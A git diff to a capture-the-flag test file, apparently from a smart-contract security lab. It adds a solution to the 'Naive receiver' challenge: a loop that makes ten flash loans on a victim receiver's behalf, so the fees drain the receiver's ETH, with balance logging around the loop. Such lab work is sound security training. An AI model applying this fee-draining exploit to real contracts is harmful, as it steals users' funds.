@@ -38,6 +38,18 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        let poolBalance = await ethers.provider.getBalance(pool.address);
+        console.log(`pool balance before:     ${poolBalance.toString()}`);
+        let receiverBalance = await ethers.provider.getBalance(receiver.address);
+        console.log(`receiver balance before: ${receiverBalance.toString()}`);
+        for (let i = 0; i < 10; i++) {
+            await pool.connect(player).flashLoan(receiver.address, ETH, 10n**18n, "0x");
+        }
+        poolBalance = await ethers.provider.getBalance(pool.address);
+        console.log(`pool balance after: ${poolBalance.toString()}`);
+        receiverBalance = await ethers.provider.getBalance(receiver.address);
+        console.log(`receiver balance after: ${receiverBalance.toString()}`);
     });
 
     after(async function () {
